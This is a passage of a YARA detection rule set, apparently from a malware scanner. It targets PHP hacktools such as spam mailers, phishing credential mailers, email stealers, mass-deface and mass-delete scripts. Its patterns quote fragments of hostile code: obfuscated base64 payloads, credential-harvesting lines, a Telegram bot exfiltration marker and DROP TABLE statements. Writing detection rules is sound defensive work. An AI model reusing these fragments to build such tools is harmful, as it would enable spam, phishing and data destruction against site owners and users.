        $ps0 = "$_SERVER['HTTP_HOST'];"
    condition:
        $ps0
}

private rule PR04152 : trigger
{
    strings:
        $ps0 = "mail($"
    condition:
        $ps0
}

rule php_hacktool_mailer_111 : hacktool
{
    strings:
        $trigger = "From:"
    condition:
        $trigger and PR00317 and PR04149 and PR04150 and PR04151 and PR04152
}

private rule PR04153 : trigger
{
    strings:
        $ps0 = "vL2Z0YWRqenJidg0KLy8vaHRtbg0KJHJlc"
    condition:
        $ps0
}

rule php_hacktool_mailer_113 : hacktool
{
    strings:
        $trigger = "='b"
    condition:
        $trigger and PR01410 and PR04153 and PR01411
}

// MANUAL FIX NECESSARY
rule php_hacktool_mailer_114 : hacktool
{
    strings:
        $trigger = "base64_decode("
        $php_hacktool_mailer_114_r0 = /echo[\s]*'[\w]+'[\s]*;[\s]*\}[\s]*else[\s]*\{[\s]*echo[\s]*'[\w]+[\s]*:/
    condition:
        $trigger and PR00301 and $php_hacktool_mailer_114_r0
}

private rule PR04154 : trigger
{
    strings:
        $ps0 = "$xPass"
    condition:
        $ps0
}

private rule PR04155 : trigger
{
    strings:
        $ps0 = "$xName"
    condition:
        $ps0
}

rule php_hacktool_mailer_115 : hacktool
{
    strings:
        $trigger = "(${$"
    condition:
        $trigger and PR04154 and PR04155 and PR01016
}

// MANUAL FIX NECESSARY
private rule PR04156 : trigger
{
    strings:
        $ps0 = "->getMessage"
    condition:
        $ps0
}

rule php_hacktool_mailer_116 : hacktool
{
    strings:
        $trigger = "mail("
        $php_hacktool_mailer_116_r0 = /\$[\w]+[\s]*=[\s]*\$_SERVER\[.HTTP_HOST.\];[\s]*\$[\w]+[\s]*=[\s]*.[\w]+.;[\s]*try[\s]*\{[\s]*mail\(\$[\w]+,[\s]*\$[\w]+,[\s]*\$[\w]+\);[\s]*\}[\s]*catch[\s]*\([^\)]+Exception[\s]*\$[\w]*\)[\s]*\{[\s]*echo[\s]*\$[\w]*->getMessage\(\);[\s]*return;[\s]*\}[\s]*echo[\s]*.[\w]+..;/
    condition:
        $trigger and PR04156 and $php_hacktool_mailer_116_r0
}

// MANUAL FIX NECESSARY
rule php_hacktool_mailer_117 : hacktool
{
    strings:
        $trigger = "$_SERVER['SERVER_NAME']"
        $php_hacktool_mailer_117_r0 = /\$[\w]+[\s]*.=[\s]*\$[\w]*[\s]*=[\s]*\$_SERVER\[.SERVER_NAME.\].\$_SERVER\[.PHP_SELF.\]...n.;[\s]*\$[\w]+[\s]*=[\s]*mail\(\$[\w]+,[\s]*\$[\w]+,[\s]*\$[\w]+,[\s]*\$[\w]+\);[\s]*if\(\$[\w]+\)[\s]*echo[\s]*.[^;]+;[\s]*else[\s]*echo[\s]*[^;]+>.;/
    condition:
        $trigger and PR00301 and $php_hacktool_mailer_117_r0
}

rule php_hacktool_mailer_118 : hacktool
{
    strings:
        $trigger = "<title>DeaRMaileR"
    condition:
        $trigger and PR00435
}

rule php_hacktool_mailer_119 : hacktool
{
    strings:
        $trigger = "JHZpc2l0YyA9ICRfQ09PS0lFWyJ2aXNpdHMiXTs"
    condition:
        $trigger and PR01398
}

rule php_hacktool_mailer_120 : hacktool
{
    strings:
        $trigger = "Dr.Inj3ction"
    condition:
        $trigger and PR00301 and PR02480
}

rule php_hacktool_mailer_122 : hacktool
{
    strings:
        $trigger = "Civilian Shell"
    condition:
        $trigger and PR00301 and PR02480
}

rule php_hacktool_mailer_123 : hacktool
{
    strings:
        $trigger = "_mb_mime_encode($subject"
    condition:
        $trigger and PR00301 and PR04124
}

private rule PR04157 : trigger
{
    strings:
        $ps0 = "lZjHDsXKcaYfQE+hhQFfgTCYEzRaHOZMHmZyYBjMOWcO9Oxz7LX"
    condition:
        $ps0
}

rule php_hacktool_mailer_124 : hacktool
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR04157
}

rule php_hacktool_mailer_125 : hacktool
{
    strings:
        $trigger = "};}if(mail($_POST[\"\\x74o\"],$_POST["
    condition:
        $trigger and PR01351
}

private rule PR04158 : trigger
{
    strings:
        $ps0 = "if(function_exists(\"mail\"))"
    condition:
        $ps0
}

private rule PR04159 : trigger
{
    strings:
        $ps0 = "Mail Working!');"
    condition:
        $ps0
}

rule php_hacktool_mailer_126 : hacktool
{
    strings:
        $trigger = "echo '1';"
    condition:
        $trigger and PR04158 and PR00301 and PR04159
}

rule php_hacktool_mailer_127 : hacktool
{
    strings:
        $trigger = "echo(\"<font color=red>Not Support For Mailer</font>\"); } ?>"
    condition:
        $trigger and PR00301
}

private rule PR04160 : trigger
{
    strings:
        $ps0 = "<font color=green>OK</font><br>"
    condition:
        $ps0
}

rule php_hacktool_mailer_128 : hacktool
{
    strings:
        $trigger = "if(mail($email[$i], '', $message, $headers"
    condition:
        $trigger and PR00039 and PR02056 and PR04160
}

rule php_hacktool_mailer_130 : hacktool
{
    strings:
        $trigger = "if(@checkdnsrr(array_pop(explode(\"@\",$email)),\"MX\")){return true;}"
    condition:
        $trigger and PR04131 and PR00301
}

private rule PR04161 : trigger
{
    strings:
        $ps0 = "$web=\"$_SERVER[HTTP_HOST]\";"
    condition:
        $ps0
}

rule php_hacktool_mailer_131 : hacktool
{
    strings:
        $trigger = "$email = \"Check@$web\";"
    condition:
        $trigger and PR04161 and PR00301 and PR02480
}

private rule PR04162 : trigger
{
    strings:
        $ps0 = "N3TWAR SPAMMER"
    condition:
        $ps0
}

rule php_hacktool_mailer_132 : hacktool
{
    strings:
        $trigger = "<title>"
    condition:
        $trigger and PR04162 and PR00301
}

rule php_hacktool_mailer_133 : hacktool
{
    strings:
        $trigger = "oFucks($_POST["
    condition:
        $trigger
}

private rule PR04163 : trigger
{
    strings:
        $ps0 = "N3TW4R INBOX"
    condition:
        $ps0
}

rule php_hacktool_mailer_134 : hacktool
{
    strings:
        $trigger = "<html"
    condition:
        $trigger and PR04163 and PR00301
}

rule php_hacktool_mailer_135 : hacktool
{
    strings:
        $trigger = "$link = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? \"https\" : \"http\") . \"://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]\";"
    condition:
        $trigger and PR00301 and PR02480
}

// MANUAL FIX NECESSARY
private rule PR04164 : trigger
{
    strings:
        $ps0 = "substr(strrchr($username, \"@\"), 1);"
    condition:
        $ps0
}

rule php_hacktool_mailer_136 : hacktool
{
    strings:
        $trigger = "$message"
        $php_hacktool_mailer_136_r0 = /\$message[\s]*\.?=[\s]*['\"][\s]*[-+=*!@#~_.\|\[\]><]{3,}[\s]*[-+=*!@#~_.><\w]{2,}/
    condition:
        $trigger and PR04164 and $php_hacktool_mailer_136_r0
}

rule php_hacktool_mailer_137 : hacktool
{
    strings:
        $trigger = "PRIV8 MA!L3R"
    condition:
        $trigger and PR00042
}

private rule PR04165 : trigger
{
    strings:
        $ps0 = "gethostbyname($_SERVER['SERVER_NAME']);"
    condition:
        $ps0
}

private rule PR04166 : trigger
{
    strings:
        $ps0 = "phpversion();"
    condition:
        $ps0
}

private rule PR04167 : trigger
{
    strings:
        $ps0 = "mail($_POST["
    condition:
        $ps0
}

rule php_hacktool_mailer_138 : hacktool
{
    strings:
        $trigger = "php_uname();"
    condition:
        $trigger and PR04165 and PR04166 and PR04167
}

rule php_hacktool_mailer_139 : hacktool
{
    strings:
        $trigger = "a5hbHLqTibXK32jEDRbi1Lu2qneNoNJmbxXXQZOOwCze+wDl2Y60"
    condition:
        $trigger and PR01398
}

private rule PR04168 : trigger
{
    strings:
        $ps0 = "echo \"$mail\\n\";"
    condition:
        $ps0
}

rule php_hacktool_mailer_140 : hacktool
{
    strings:
        $trigger = "if (mail($mail, $subject, $letter, $headers))"
    condition:
        $trigger and PR04168
}

private rule PR04169 : trigger
{
    strings:
        $ps0 = "var data = \"ajax=1&from="
    condition:
        $ps0
}

private rule PR04170 : trigger
{
    strings:
        $ps0 = "$headers .= \"From"
    condition:
        $ps0
}

rule php_hacktool_mailer_141 : hacktool
{
    strings:
        $trigger = "$subject"
    condition:
        $trigger and PR04169 and PR00301 and PR04170
}

private rule PR04171 : trigger
{
    strings:
        $ps0 = "SMTP CRACKER"
    condition:
        $ps0
}

rule php_hacktool_mailer_142 : hacktool
{
    strings:
        $trigger = "eval(${$"
    condition:
        $trigger and PR04171
}

private rule PR04172 : trigger
{
    strings:
        $ps0 = "foreach(array(\"Server Name\" => @php_uname(), \"System"
    condition:
        $ps0
}

rule php_hacktool_mailer_143 : hacktool
{
    strings:
        $trigger = "pass"
    condition:
        $trigger and PR02406 and PR01479 and PR04172
}

private rule PR04173 : trigger
{
    strings:
        $ps0 = "$body=$back;"
    condition:
        $ps0
}

rule php_hacktool_mailer_144 : hacktool
{
    strings:
        $trigger = "$back=$_SERVER[\"HTTP_HOST\"] . $_SERVER[\"REQUEST_URI\"];"
    condition:
        $trigger and PR04173 and PR00301
}

private rule PR04174 : trigger
{
    strings:
        $ps0 = "$back=$_SERVER[\"HTTP_HOST\"] . $_SERVER[\"REQUEST_URI\"];"
    condition:
        $ps0
}

rule php_hacktool_mailer_145 : hacktool
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR04174
}

private rule PR04175 : trigger
{
    strings:
        $ps0 = "echo \"<br>Sending Email To : \".$email.\" => Done\";"
    condition:
        $ps0
}

rule php_hacktool_mailer_146 : hacktool
{
    strings:
        $trigger = "Content-type:text/html"
    condition:
        $trigger and PR01806 and PR04175 and PR04152
}

private rule PR04176 : trigger
{
    strings:
        $ps0 = "(isset($_SERVER["
    condition:
        $ps0
}

private rule PR04177 : trigger
{
    strings:
        $ps0 = "if (isset($_POST['email"
    condition:
        $ps0
}

rule php_hacktool_mailer_147 : hacktool
{
    strings:
        $trigger = "json_decode(file_get_contents("
    condition:
        $trigger and PR00301 and PR02480 and PR04176 and PR04177
}

private rule PR04178 : trigger
{
    strings:
        $ps0 = "$url = $url . \"&text=\" . urlencode($messaggio);"
    condition:
        $ps0
}

rule php_hacktool_mailer_148 : hacktool
{
    strings:
        $trigger = "top.location"
    condition:
        $trigger and PR01330 and PR04178
}

private rule PR04179 : trigger
{
    strings:
        $ps0 = "document.location.href=\"https://outlook.office"
    condition:
        $ps0
}

rule php_hacktool_mailer_149 : hacktool
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR04179
}

private rule PR04180 : trigger
{
    strings:
        $ps0 = "function kirim_mail($"
    condition:
        $ps0
}

private rule PR04181 : trigger
{
    strings:
        $ps0 = "Content-Type"
    condition:
        $ps0
}

rule php_hacktool_mailer_150 : hacktool
{
    strings:
        $trigger = "$subject"
    condition:
        $trigger and PR04180 and PR04181 and PR02163
}

private rule PR04182 : trigger
{
    strings:
        $ps0 = "FZvHkoPKskU/554TDPAuXtwBAuG9h8kNPAjvzdc"
    condition:
        $ps0
}

rule php_hacktool_mailer_151 : hacktool
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR04182 and PR00029
}

private rule PR04183 : trigger
{
    strings:
        $ps0 = "$results[] = array( 'code' => 'OK', 'msg' => \"Directory $dir is writable\" );"
    condition:
        $ps0
}

rule php_hacktool_mailer_152 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR01468 and PR04183
}

rule php_hacktool_mailer_153 : hacktool
{
    strings:
        $trigger = "<title>.::: STRONG MAILER"
    condition:
        $trigger
}

rule php_hacktool_mailer_154 : hacktool
{
    strings:
        $trigger = "\"|-----------"
    condition:
        $trigger and PR00279
}

private rule PR04184 : trigger
{
    strings:
        $ps0 = "if(mail($_GET['email'],\"Working Id# \".$_GET['id'],\"Working \".$_GET['id'])) print"
    condition:
        $ps0
}

rule php_hacktool_mailer_155 : hacktool
{
    strings:
        $trigger = "exit"
    condition:
        $trigger and PR00732 and PR04184
}

rule php_hacktool_mailer_156 : hacktool
{
    strings:
        $trigger = "HZu3csNYtkU/Z7oLAUh41IvgvfdIpuC99"
    condition:
        $trigger and PR00029 and PR01436
}

// MANUAL FIX NECESSARY
private rule PR04185 : trigger
{
    strings:
        $ps0 = "</font>Number of emails"
    condition:
        $ps0
}

rule php_hacktool_mailer_157 : hacktool
{
    strings:
        $trigger = "$_POST"
        $php_hacktool_mailer_157_r0 = /\}[\s]*\?>/
    condition:
        $trigger and PR04185 and PR00397 and $php_hacktool_mailer_157_r0
}

private rule PR04186 : trigger
{
    strings:
        $ps0 = "<H2>PR1V8 M4IL3R BY"
    condition:
        $ps0
}

rule php_hacktool_mailer_158 : hacktool
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR04186 and PR00437 and PR00301
}

rule php_hacktool_mailer_159 : hacktool
{
    strings:
        $trigger = "CnNlc3Npb25fc3RhcnQoKTsKZXJyb3JfcmVwb3J0aW5nKDApOwpzZXRfdGltZV9saW1pdCgwKTsKaW5pX3NldCgibWVtb3J5X2xpbWl0IiwtMSk7CgokbGVhZlsndmVyc2"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR04187 : trigger
{
    strings:
        $ps0 = ".$_SERVER['SERVER_NAME'].\"\".$_SERVER['REQUEST_URI'].\"\\nInfo"
    condition:
        $ps0
}

rule php_hacktool_mailer_160 : hacktool
{
    strings:
        $trigger = "mail("
    condition:
        $trigger and PR04187
}

private rule PR04188 : trigger
{
    strings:
        $ps0 = "):chunk_split(base64_encode($"
    condition:
        $ps0
}

private rule PR04189 : trigger
{
    strings:
        $ps0 = "),NULL,iconv_mime_encode(_"
    condition:
        $ps0
}

rule php_hacktool_mailer_161 : hacktool
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR04188 and PR04189
}

// MANUAL FIX NECESSARY
private rule PR04190 : trigger
{
    strings:
        $ps0 = "$_POST["
    condition:
        $ps0
}

private rule PR04191 : trigger
{
    strings:
        $ps0 = "From:"
    condition:
        $ps0
}

rule php_hacktool_mailer_162 : hacktool
{
    strings:
        $trigger = "mail($to"
        $php_hacktool_mailer_162_r0 = /\$subject[\s]*=[\s]*\$_POST\[.subject/
    condition:
        $trigger and PR04190 and PR04191 and $php_hacktool_mailer_162_r0
}

private rule PR04192 : trigger
{
    strings:
        $ps0 = "$url, 'From:"
    condition:
        $ps0
}

rule php_hacktool_mailer_163 : hacktool
{
    strings:
        $trigger = "$url = (!empty($_SERVER['HTTPS'])) ? \"https://\".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'] : \"http://\".$_SERVER['SERVER_NAME'].$_SERVER['REQUEST_URI'];"
    condition:
        $trigger and PR04192 and PR00301
}

private rule PR04193 : trigger
{
    strings:
        $ps0 = ";} else {echo"
    condition:
        $ps0
}

rule php_hacktool_mailer_164 : hacktool
{
    strings:
        $trigger = "foreach($_POST as $"
    condition:
        $trigger and PR00437 and PR04085 and PR04193
}

// MANUAL FIX NECESSARY
private rule PR04194 : trigger
{
    strings:
        $ps0 = "isset($_POST[\"password\"]) &&"
    condition:
        $ps0
}

private rule PR04195 : trigger
{
    strings:
        $ps0 = "for($i = 0; $i < $"
    condition:
        $ps0
}

rule php_hacktool_mailer_165 : hacktool
{
    strings:
        $trigger = "echo json_encode($"
        $php_hacktool_mailer_165_r0 = /\$_POST\[.[pP][aA][sS][sS][wW][oO][rR][dD].\]/
    condition:
        $trigger and PR04194 and PR00301 and PR04195 and PR00247 and $php_hacktool_mailer_165_r0
}

private rule PR04196 : trigger
{
    strings:
        $ps0 = "<title>Owl PHPMailer <?php echo"
    condition:
        $ps0
}

rule php_hacktool_mailer_166 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04196 and PR00355 and PR00357 and PR02033
}

private rule PR04197 : trigger
{
    strings:
        $ps0 = "->Parse('{from_user}@' . $"
    condition:
        $ps0
}

private rule PR04198 : trigger
{
    strings:
        $ps0 = "++; } echo serialize(array("
    condition:
        $ps0
}

rule php_hacktool_mailer_167 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04197 and PR04198
}

rule php_hacktool_mailer_168 : hacktool
{
    strings:
        $trigger = "JHR1anVhbm1haWwgPSAnS2VsdWFyZ2FIbWVpN0B5YW5kZXguY29tJzsKJHhfcGF0aCA9ICJodHRwOi8vIiAuICRfU0VSVkVSWydTRVJWR"
    condition:
        $trigger and PR01398
}

private rule PR04199 : trigger
{
    strings:
        $ps0 = "<center>LOGIN DETILS</center>"
    condition:
        $ps0
}

rule php_hacktool_mailer_169 : hacktool
{
    strings:
        $trigger = "$_POST"
    condition:
        $trigger and PR00437 and PR00301 and PR04199
}

private rule PR04200 : trigger
{
    strings:
        $ps0 = "$from_user = $to_data"
    condition:
        $ps0
}

private rule PR04201 : trigger
{
    strings:
        $ps0 = "base64_decode($"
    condition:
        $ps0
}

rule php_hacktool_mailer_170 : hacktool
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR04200 and PR04201
}

rule php_hacktool_mailer_171 : hacktool
{
    strings:
        $trigger = "<title>XasTrO Mailer</title>"
    condition:
        $trigger
}

private rule PR04202 : trigger
{
    strings:
        $ps0 = "if ($_COOKIE['cookies'] == md5($"
    condition:
        $ps0
}

private rule PR04203 : trigger
{
    strings:
        $ps0 = "substr(str_shuffle(str_repeat("
    condition:
        $ps0
}

rule php_hacktool_mailer_172 : hacktool
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR01780 and PR04202 and PR04203
}

private rule PR04204 : trigger
{
    strings:
        $ps0 = "$cpanelid"
    condition:
        $ps0
}

private rule PR04205 : trigger
{
    strings:
        $ps0 = "if(function_exists(\"mail\")) {"
    condition:
        $ps0
}

rule php_hacktool_mailer_173 : hacktool
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR01780 and PR04204 and PR04205
}

private rule PR04206 : trigger
{
    strings:
        $ps0 = "function sendMail($to, $subject"
    condition:
        $ps0
}

private rule PR04207 : trigger
{
    strings:
        $ps0 = "md5(rand());"
    condition:
        $ps0
}

rule php_hacktool_mailer_174 : hacktool
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR04206 and PR04207 and PR04201
}

private rule PR04208 : trigger
{
    strings:
        $ps0 = "$password = $_POST['password'];"
    condition:
        $ps0
}

rule php_hacktool_mailer_175 : hacktool
{
    strings:
        $trigger = "$_SERVER['REMOTE_ADDR'];"
    condition:
        $trigger and PR00301 and PR04208
}

rule php_hacktool_mailer_176 : hacktool
{
    strings:
        $trigger = "Priv8 Mailer"
    condition:
        $trigger and PR00042
}

private rule PR04209 : trigger
{
    strings:
        $ps0 = "lXjHDsXKceUH6Cu0MOAnEAZzgqwFc46Xl8kwDOac"
    condition:
        $ps0
}

rule php_hacktool_mailer_177 : hacktool
{
    strings:
        $trigger = "gzinflate(base64_decode("
    condition:
        $trigger and PR00029 and PR04209
}

private rule PR04210 : trigger
{
    strings:
        $ps0 = "chunk_split(base64_encode($msg));"
    condition:
        $ps0
}

rule php_hacktool_mailer_178 : hacktool
{
    strings:
        $trigger = "mail($"
    condition:
        $trigger and PR04190 and PR04210 and PR04191
}

private rule PR04211 : trigger
{
    strings:
        $ps0 = ");exit();endif;if(isset($_REQUEST[_"
    condition:
        $ps0
}

private rule PR04212 : trigger
{
    strings:
        $ps0 = ",);}}@ini_set(_"
    condition:
        $ps0
}

rule php_hacktool_mailer_179 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04211 and PR04212 and PR00357
}

rule php_hacktool_mailer_180 : hacktool
{
    strings:
        $trigger = ": eval(eval(eval(eval(eval(eval(eval(eval("
    condition:
        $trigger and PR00634
}

private rule PR04213 : trigger
{
    strings:
        $ps0 = "mail($to"
    condition:
        $ps0
}

private rule PR04214 : trigger
{
    strings:
        $ps0 = "Die for LOA in A or O"
    condition:
        $ps0
}

rule php_hacktool_mailer_181 : hacktool
{
    strings:
        $trigger = "From:"
    condition:
        $trigger and PR04190 and PR04213 and PR04214
}

rule php_hacktool_mailer_182 : hacktool
{
    strings:
        $trigger = "ZWNobyAnIyNTVEFSVF9EQVRBIyMnOw0KJGkgPSAwOw"
    condition:
        $trigger and PR01398
}

rule php_hacktool_mailer_183 : hacktool
{
    strings:
        $trigger = "$subject = \"New Login : ip\";"
    condition:
        $trigger
}

rule php_hacktool_mailer_184 : hacktool
{
    strings:
        $trigger = "<TITLE>Verifying...</TITLE>"
    condition:
        $trigger and PR00317
}

private rule PR04215 : trigger
{
    strings:
        $ps0 = "CnNlc3Npb25fc3RhcnQoKTsKZXJyb3Jfc"
    condition:
        $ps0
}

rule php_hacktool_mailer_185 : hacktool
{
    strings:
        $trigger = "(base64_decode("
    condition:
        $trigger and PR01398 and PR04215
}

private rule PR04216 : trigger
{
    strings:
        $ps0 = "||POSTDEMON.FROM.OPIO||"
    condition:
        $ps0
}

rule php_hacktool_mailer_186 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR00113 and PR04216 and PR01428 and PR01021
}

rule php_hacktool_mailer_187 : hacktool
{
    strings:
        $trigger = "LH3FtqXK0u7TnGRCE5cm7u5n7sB64s7T"
    condition:
        $trigger and PR02205
}

private rule PR04217 : trigger
{
    strings:
        $ps0 = "str_replace(array(\"name\", \"\\n\", \"\\t\", \" \", \"-\", \"_\"), NULL, strtolower(trim($purpose)));"
    condition:
        $ps0
}

rule php_hacktool_mailer_188 : hacktool
{
    strings:
        $trigger = "$message .= \"Password : {$password} <br>\\n\";"
    condition:
        $trigger and PR02062 and PR01021 and PR04217
}

private rule PR04218 : trigger
{
    strings:
        $ps0 = "foreach ($os_a as $regex => $value)"
    condition:
        $ps0
}

private rule PR04219 : trigger
{
    strings:
        $ps0 = "@json_decode(file_get_contents("
    condition:
        $ps0
}

rule php_hacktool_mailer_189 : hacktool
{
    strings:
        $trigger = "$message = \"<div style='background: #1A1A1A; text-align: center;"
    condition:
        $trigger and PR04218 and PR04219
}

private rule PR04220 : trigger
{
    strings:
        $ps0 = "){if(strtoupper(substr(PHP_OS,"
    condition:
        $ps0
}

rule php_hacktool_mailer_190 : hacktool
{
    strings:
        $trigger = "fsockopen"
    condition:
        $trigger and PR04220 and PR03969
}

private rule PR04221 : trigger
{
    strings:
        $ps0 = "api.telegram.org/bot"
    condition:
        $ps0
}

private rule PR04222 : trigger
{
    strings:
        $ps0 = "ocation"
    condition:
        $ps0
}

rule php_hacktool_mailer_191 : hacktool
{
    strings:
        $trigger = "message .="
    condition:
        $trigger and PR03786 and PR04221 and PR04222 and PR00279 and PR04093
}

private rule PR04223 : trigger
{
    strings:
        $ps0 = "8nyaNtTXrN+c2bihWzjzMhI88wAk8QZqgZBmPEYKQ0T1lEnaZyHQ"
    condition:
        $ps0
}

rule php_hacktool_mailer_192 : hacktool
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR00029 and PR04223
}

private rule PR04224 : trigger
{
    strings:
        $ps0 = ";exit();}"
    condition:
        $ps0
}

private rule PR04225 : trigger
{
    strings:
        $ps0 = ".= \"Avlanan Site : \" . $_SERVER['HTTP_HOST'] . \"\\r\\n\";"
    condition:
        $ps0
}

rule php_hacktool_mailer_193 : hacktool
{
    strings:
        $trigger = "file_get_contents"
    condition:
        $trigger and PR04224 and PR00355 and PR01392 and PR04225 and PR00357
}

rule php_hacktool_mailer_194 : hacktool
{
    strings:
        $trigger = "\\120\\104\\71\\x77\\x61\\x48\\101"
    condition:
        $trigger and PR00029 and PR01422
}

rule php_hacktool_mailer_gen_001 : hacktool
{
    strings:
        $trigger = "$result = mail(stripslashes($to), stripslashes($subject), stripslashes($message), stripslashes($header));"
    condition:
        $trigger
}

private rule PR04226 : trigger
{
    strings:
        $ps0 = "\\x67\\x65\\x74\\x73\\x70\\x61\\x6D\\x74\\x6F\\x6F\\x6C\\x2E\\x63\\x6F\\x6D"
    condition:
        $ps0
}

rule php_hacktool_mailer_gen_003 : hacktool
{
    strings:
        $trigger = "document.getElementsByTagName"
    condition:
        $trigger and PR00777 and PR04226
}

rule php_hacktool_mailer_gen_004 : hacktool
{
    strings:
        $trigger = "$txt .= \"USER:"
    condition:
        $trigger and PR00301
}

rule php_hacktool_mailer_gen_005 : hacktool
{
    strings:
        $trigger = "ZxHj4NKFoV/zrwnFmQwmhU5R5M3I3LOmV8/7oWlt"
    condition:
        $trigger and PR00029 and PR01436
}

rule php_hacktool_mailmailer_001 : hacktool
{
    strings:
        $trigger = "sendstatus.document.write('<title>MailMailer Status</title></head>"
    condition:
        $trigger and PR00301
}

rule php_hacktool_mailstealer_001 : hacktool
{
    strings:
        $trigger = "echo \"<span class='red'>$f</span> Emails Founded. Check <span class='red'>\".htmlspecialchars($_GET['name"
    condition:
        $trigger
}

private rule PR04227 : trigger
{
    strings:
        $ps0 = "function cek_email($file"
    condition:
        $ps0
}

rule php_hacktool_mailstealer_002 : hacktool
{
    strings:
        $trigger = "buka_dir($cwd);"
    condition:
        $trigger and PR04227
}

private rule PR04228 : trigger
{
    strings:
        $ps0 = "$sql = \"SELECT user_email FROM \".$mysqli->real_escape_string($table_prefix).\"users\";"
    condition:
        $ps0
}

rule php_hacktool_mailstealer_003 : hacktool
{
    strings:
        $trigger = "echo"
    condition:
        $trigger and PR04228 and PR01431
}

rule php_hacktool_massdelete_001 : hacktool
{
    strings:
        $trigger = "<title>@del</title>"
    condition:
        $trigger
}

private rule PR04229 : trigger
{
    strings:
        $ps0 = "rrmdir($dir)"
    condition:
        $ps0
}

private rule PR04230 : trigger
{
    strings:
        $ps0 = "All Files/Folders"
    condition:
        $ps0
}

rule php_hacktool_massdelete_002 : hacktool
{
    strings:
        $trigger = "= getcwd()"
    condition:
        $trigger and PR04229 and PR04230 and PR02394
}

rule php_hacktool_massdelete_003 : hacktool
{
    strings:
        $trigger = "$dir = getcwd();"
    condition:
        $trigger and PR04000 and PR04002 and PR04004
}

rule php_hacktool_massdelete_004 : hacktool
{
    strings:
        $trigger = "X21hdGNoKCRyZWcsJGZpbGUpKQ0KCQl1bmxpbmsoJGZpbGUpOw0"
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR04231 : trigger
{
    strings:
        $ps0 = "LnBocCcsIDA3NzcpOw0KICAgIGZpbGVfcHV0X2NvbnRlbnRz"
    condition:
        $ps0
}

rule php_hacktool_massdelete_004_02 : hacktool
{
    strings:
        $trigger = "base64_decode"
    condition:
        $trigger and PR04231 and PR00029
}

rule php_hacktool_massdelete_004_03 : hacktool
{
    strings:
        $trigger = "MDc3Nyk7DQogICAgdW5saW5rKCd3YXRlcm1hcmsvcHVibGljX2h0bWwnKTsNCn0NCg=="
    condition:
        $trigger and PR00029 and PR01422
}

private rule PR04232 : trigger
{
    strings:
        $ps0 = "if(is_file($file)){"
    condition:
        $ps0
}

rule php_hacktool_massdelete_005 : hacktool
{
    strings:
        $trigger = "$files = glob($path.'/*');"
    condition:
        $trigger and PR04232 and PR02020
}

private rule PR04233 : trigger
{
    strings:
        $ps0 = "<title>Mass Inbox Mailer v2.0</title>"
    condition:
        $ps0
}

rule php_hacktool_massinboxmailer20_001 : hacktool
{
    strings:
        $trigger = "include"
    condition:
        $trigger and PR04233
}

private rule PR04234 : trigger
{
    strings:
        $ps0 = "WP MASS</title>"
    condition:
        $ps0
}

rule php_hacktool_massdeface_001 : hacktool
{
    strings:
        $trigger = "mysql"
    condition:
        $trigger and PR04234
}

rule php_hacktool_massdeface_002 : hacktool
{
    strings:
        $trigger = ">~~./Mass Deface 2~~<"
    condition:
        $trigger
}

rule php_hacktool_massdeface_003 : hacktool
{
    strings:
        $trigger = "Hacked by l0c4lh34rtz"
    condition:
        $trigger
}

rule php_hacktool_massdeface_004 : hacktool
{
    strings:
        $trigger = "$defaceurl = $_POST['massdefaceurl'];"
    condition:
        $trigger and PR02700
}

rule php_hacktool_morphine_kit_001 : hacktool
{
    strings:
        $trigger = "_il_exec')){return _il_exec();}echo('Morphine kit require PHP"
    condition:
        $trigger and PR01480
}

private rule PR04235 : trigger
{
    strings:
        $ps0 = "echo \"Database \".DB_NAME.\" was successfully dropped"
    condition:
        $ps0
}

rule php_hacktool_mysql_drop_002 : hacktool
{
    strings:
        $trigger = "mysql"
    condition:
        $trigger and PR03877 and PR04235
}

private rule PR04236 : trigger
{
    strings:
        $ps0 = "$wpdb->query($"
    condition:
        $ps0
}

private rule PR04237 : trigger
{
    strings:
        $ps0 = "= \"DROP TABLE IF EXISTS"
    condition:
        $ps0
}

private rule PR04238 : trigger
{
    strings:
        $ps0 = "= \"SHOW TABLES LIKE '%'\""
    condition:
        $ps0
}

rule php_hacktool_mysql_drop_003 : hacktool
{
    strings:
        $trigger = "get_"
    condition:
        $trigger and PR04236 and PR04237 and PR04238
}

private rule PR04239 : trigger
{
    strings:
        $ps0 = "setcookie( \"mysql_web_admin_password\""
    condition:
        $ps0
}

rule php_hacktool_mysql_shell_001 : hacktool
{
    strings:
        $trigger = "ini_get"
    condition:
        $trigger and PR04239
}

rule php_hacktool_navicat_HTTP_tunnel_tester_001 : hacktool
{
    strings:
        $trigger = "<title>Navicat HTTP Tunnel Tester</title>"
    condition:
        $trigger
}

rule php_hacktool_packer_004 : hacktool
{
    strings:
        $trigger = ">DONE!</span>"
    condition:
        $trigger and PR00265
}

rule php_hacktool_packer_005 : hacktool
{
    strings:
        $trigger = "INDONESIA GALAUERS"
    condition:
        $trigger and PR00042
}

private rule PR04240 : trigger
{
    strings:
        $ps0 = "$remoteZip=@$_POST['remotezip'];"
    condition:
        $ps0
}

rule php_hacktool_packer_006 : hacktool
{
    strings:
        $trigger = "@touch($filePath, $needFileTime, $needFileTime);"
    condition:
        $trigger and PR04240
}

private rule PR04241 : trigger
{
    strings:
        $ps0 = "die(\"Error : \".$archive->errorInfo(true));"
    condition:
        $ps0
}

private rule PR04242 : trigger
{
    strings:
